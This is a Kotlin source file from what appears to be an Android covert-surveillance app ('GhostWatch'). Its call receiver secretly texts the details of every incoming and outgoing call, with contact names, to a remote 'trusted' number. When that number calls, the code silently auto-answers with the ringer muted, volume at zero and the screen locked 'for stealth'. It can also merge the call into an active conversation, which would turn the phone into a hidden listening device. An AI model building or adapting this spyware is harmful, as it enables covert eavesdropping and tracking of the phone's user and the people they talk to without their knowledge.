package com.ghostwatch.app.receiver

import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.media.AudioManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.telecom.TelecomManager
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import com.ghostwatch.app.GhostConfig
import com.ghostwatch.app.service.GhostAccessibilityService
import com.ghostwatch.app.service.GhostService
import java.text.SimpleDateFormat
import java.util.*

class CallReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "CallReceiver"

        // True when a call is already active (OFFHOOK) — used to detect call-waiting scenario
        @Volatile private var wasOffhook = false

        // Saved audio state — restored when call ends
        @Volatile private var savedRingerMode = AudioManager.RINGER_MODE_NORMAL
        @Volatile private var savedRingVolume = -1
        @Volatile private var savedVoiceVolume = -1

        // True while a trusted auto-answered call is active — read by GhostAccessibilityService
        @Volatile var trustedCallActive = false
    }

    override fun onReceive(context: Context, intent: Intent) {
        // ── OUTGOING call started ─────────────────────────────────
        if (intent.action == Intent.ACTION_NEW_OUTGOING_CALL) {
            if (isCallWatchActive(context)) {
                val number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER) ?: "Unknown"
                notifyOutgoingCall(context, number)
            }
            return
        }

        if (intent.action != TelephonyManager.ACTION_PHONE_STATE_CHANGED) return

        val state  = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

        // ── RINGING: someone is calling ──────────────────────────
        if (state == TelephonyManager.EXTRA_STATE_RINGING) {
            val caller = number ?: "Unknown"
            Log.d(TAG, "Incoming call from: $caller")

            // Notify if monitoring is active OR call watch is on
            if (GhostService.isActive.get() || isCallWatchActive(context)) {
                val contactName = getContactName(context, caller)
                notifyCallerToKashmir(context, caller, contactName)
            }

            // Auto-answer ONLY if it's the trusted number calling
            if (number != null && isTrustedNumber(number)) {
                Log.d(TAG, "Trusted number — auto-answering${if (wasOffhook) " (call waiting — will merge)" else ""}")
                muteRinger(context)  // silence before first ring completes
                trustedCallActive = true
                GhostAccessibilityService.pendingAnswer = true

                // If a call was already active, schedule merge after answering
                if (wasOffhook) {
                    val mergeDelay = GhostConfig.AUTO_ANSWER_DELAY_MS + GhostConfig.MERGE_DELAY_MS
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (!GhostAccessibilityService.pendingAnswer) {
                            // Only arm merge if answer phase completed
                            GhostAccessibilityService.pendingMerge = true
                            Log.d(TAG, "Merge armed")
                        }
                    }, mergeDelay)
                }

                Handler(Looper.getMainLooper()).postDelayed({
                    answerCall(context)
                }, GhostConfig.AUTO_ANSWER_DELAY_MS)
            }
        }

        // OFFHOOK = call connected; push to background and lock screen in one step
        if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
            wasOffhook = true
            GhostAccessibilityService.pendingAnswer = false
            val appContext = context.applicationContext
            Handler(Looper.getMainLooper()).postDelayed({
                GhostAccessibilityService.instance?.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                )
                lockScreen(appContext)
            }, 200L)
        }

        // IDLE = all calls ended; clear everything and restore ringer
        if (state == TelephonyManager.EXTRA_STATE_IDLE) {
            wasOffhook = false
            trustedCallActive = false
            GhostAccessibilityService.pendingAnswer = false
            GhostAccessibilityService.pendingMerge = false
            GhostAccessibilityService.pendingHangup = false
            restoreRinger(context)
        }
    }

    // ── Outgoing call notification ────────────────────────────────

    private fun notifyOutgoingCall(context: Context, number: String) {
        val time = SimpleDateFormat("HH:mm dd/MM", Locale.getDefault()).format(Date())
        val contactName = getContactName(context, number)
        val msg = buildString {
            appendLine("📞 OUTGOING — Delhi Flat")
            if (contactName != null) {
                appendLine("To:   $contactName")
                appendLine("Num:  $number")
            } else {
                appendLine("To:   $number")
            }
            appendLine("Time: $time")
            append("→ Outgoing call")
        }.trim()
        sendSms(context, GhostConfig.TRUSTED_NUMBER, msg)
        Log.d(TAG, "Outgoing call SMS sent: $msg")
    }

    // ── Build and send caller ID SMS to your Kashmir number ───────

    private fun notifyCallerToKashmir(context: Context, number: String, contactName: String?) {
        val time = SimpleDateFormat("HH:mm dd/MM", Locale.getDefault()).format(Date())

        val msg = buildString {
            appendLine("📞 CALL — Delhi Flat")
            // Show contact name if found in phone's contacts
            if (contactName != null) {
                appendLine("Name: $contactName")
                appendLine("Num:  $number")
            } else {
                appendLine("From: $number")
            }
            appendLine("Time: $time")
            // Tell you whether it was auto-answered or just rang
            if (isTrustedNumber(number)) {
                append("→ Your call — auto-answering")
            } else {
                append("→ Not answered")
            }
        }.trim()

        sendSms(context, GhostConfig.TRUSTED_NUMBER, msg)
        Log.d(TAG, "Caller ID SMS sent: $msg")
    }

    // ── Look up contact name from phone's address book ────────────

    private fun getContactName(context: Context, phoneNumber: String): String? {
        if (phoneNumber.isBlank() || phoneNumber == "Unknown") return null
        var cursor: Cursor? = null
        return try {
            val uri = android.net.Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(phoneNumber)
            )
            cursor = context.contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )
            if (cursor != null && cursor.moveToFirst()) {
                cursor.getString(
                    cursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME)
                )
            } else null
        } catch (e: Exception) {
            Log.e(TAG, "Contact lookup failed: ${e.message}")
            null
        } finally {
            cursor?.close()
        }
    }

    // ── Silently answer the call — tries all methods for MIUI compatibility ──

    private fun answerCall(context: Context) {
        // Method 1: TelecomManager (standard Android, often ignored by MIUI)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val telecom = context.getSystemService(TelecomManager::class.java)
                telecom?.acceptRingingCall()
                Log.d(TAG, "TelecomManager.acceptRingingCall() called")
            } catch (e: Exception) {
                Log.w(TAG, "TelecomManager failed: ${e.message}")
            }
        }

        // Method 2: Intent.ACTION_ANSWER — works on some MIUI versions when TelecomManager doesn't
        try {
            val intent = Intent(Intent.ACTION_ANSWER).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            context.startActivity(intent)
            Log.d(TAG, "ACTION_ANSWER intent sent")
        } catch (e: Exception) {
            Log.w(TAG, "ACTION_ANSWER failed: ${e.message}")
        }

        // Method 3: Headset hook broadcast (legacy fallback)
        try {
            val event = android.view.KeyEvent(
                android.view.KeyEvent.ACTION_DOWN,
                android.view.KeyEvent.KEYCODE_HEADSETHOOK
            )
            val intent = Intent(Intent.ACTION_MEDIA_BUTTON).apply {
                putExtra(Intent.EXTRA_KEY_EVENT, event)
            }
            context.sendOrderedBroadcast(intent, null)
            Log.d(TAG, "Headset hook broadcast sent")
        } catch (e: Exception) {
            Log.w(TAG, "Headset hook failed: ${e.message}")
        }

        // Method 4: AccessibilityService (already armed above — clicks the MIUI answer button)
        // GhostAccessibilityService.pendingAnswer was set to true before this delay fired

        // Earpiece mode + zero volume so no audio leaks from the device
        try {
            val am = context.getSystemService(AudioManager::class.java)
            am?.isSpeakerphoneOn = false
            am?.mode = AudioManager.MODE_IN_CALL
            savedVoiceVolume = am?.getStreamVolume(AudioManager.STREAM_VOICE_CALL) ?: savedVoiceVolume
            am?.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0)
        } catch (e: Exception) {
            Log.w(TAG, "Audio mode failed: ${e.message}")
        }
    }

    // ── Stealth: ringer + screen ──────────────────────────────────

    private fun muteRinger(context: Context) {
        try {
            val am = context.getSystemService(AudioManager::class.java)
            savedRingerMode = am.ringerMode
            savedRingVolume = am.getStreamVolume(AudioManager.STREAM_RING)
            am.ringerMode = AudioManager.RINGER_MODE_SILENT
            Log.d(TAG, "Ringer silenced for stealth (was mode=$savedRingerMode vol=$savedRingVolume)")
        } catch (e: Exception) {
            Log.w(TAG, "Mute failed: ${e.message}")
        }
    }

    private fun restoreRinger(context: Context) {
        if (savedRingVolume < 0 && savedVoiceVolume < 0) return
        try {
            val am = context.getSystemService(AudioManager::class.java)
            if (savedRingVolume >= 0) {
                am.ringerMode = savedRingerMode
                am.setStreamVolume(AudioManager.STREAM_RING, savedRingVolume, 0)
                savedRingVolume = -1
            }
            if (savedVoiceVolume >= 0) {
                am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, savedVoiceVolume, 0)
                savedVoiceVolume = -1
            }
            Log.d(TAG, "Audio restored")
        } catch (e: Exception) {
            Log.w(TAG, "Audio restore failed: ${e.message}")
        }
    }

    private fun lockScreen(context: Context) {
        try {
            val dpm = context.getSystemService(DevicePolicyManager::class.java)
            val admin = ComponentName(context, GhostDeviceAdmin::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                Log.d(TAG, "Screen locked for stealth")
            } else {
                Log.w(TAG, "Device admin not active — screen not locked")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Screen lock failed: ${e.message}")
        }
    }

    // ── Helpers ───────────────────────────────────────────────────

    private fun isCallWatchActive(context: Context): Boolean =
        context.getSharedPreferences("ghost_prefs", Context.MODE_PRIVATE)
            .getBoolean("call_watch_active", false)

    private fun isTrustedNumber(incoming: String): Boolean {
        val trusted = GhostConfig.TRUSTED_NUMBER
        if (trusted.isBlank()) return false
        val a = normalizeNumber(incoming)
        val b = normalizeNumber(trusted)
        return a.endsWith(b) || b.endsWith(a)
    }

    private fun normalizeNumber(number: String): String {
        return number
            .replace(Regex("[\\s\\-().+]"), "")
            .trimStart('0')
            .let { if (it.startsWith("91") && it.length > 10) it.substring(2) else it }
    }

    private fun sendSms(context: Context, number: String, message: String) {
        if (number.isBlank()) return
        try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            val parts = smsManager.divideMessage(message)
            if (parts.size == 1) {
                smsManager.sendTextMessage(number, null, message, null, null)
            } else {
                smsManager.sendMultipartTextMessage(number, null, parts, null, null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS failed: ${e.message}")
        }
    }
}
